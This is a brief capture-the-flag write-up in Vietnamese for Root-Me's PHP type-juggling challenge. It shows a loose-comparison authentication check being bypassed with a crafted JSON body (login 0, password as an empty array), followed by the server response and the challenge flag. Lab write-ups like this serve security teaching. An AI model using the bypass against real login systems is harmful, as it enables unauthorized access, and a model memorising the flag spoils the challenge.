# [PHP - type juggling](https://www.root-me.org/en/Challenges/Web-Server/PHP-type-juggling)

## Solutions

```php
if($auth['data']['login'] == $USER && !strcmp($auth['data']['password'], $PASSWORD_SHA256)){
        $return['status'] = "Access granted! The validation password is: $FLAG";
    }
```

- Để bypass qua điều kiện 1 thì có thể để `$auth['data']['login'] = 0`
- Để bypass qua điều kiện 2 thì có thể để `$auth['data']['password'] = []`

Thay đổi request body:

```json
{"data":{"login":0,"password":[]}}
```

Response:

```json
{"status":"Access granted! The validation password is: DontForgetPHPL00seComp4r1s0n\n"}
```

Flag: `DontForgetPHPL00seComp4r1s0n`

## References

- <https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20PHP%20loose%20comparison%20-%20Type%20Juggling%20-%20OWASP.pdf?_gl=1>
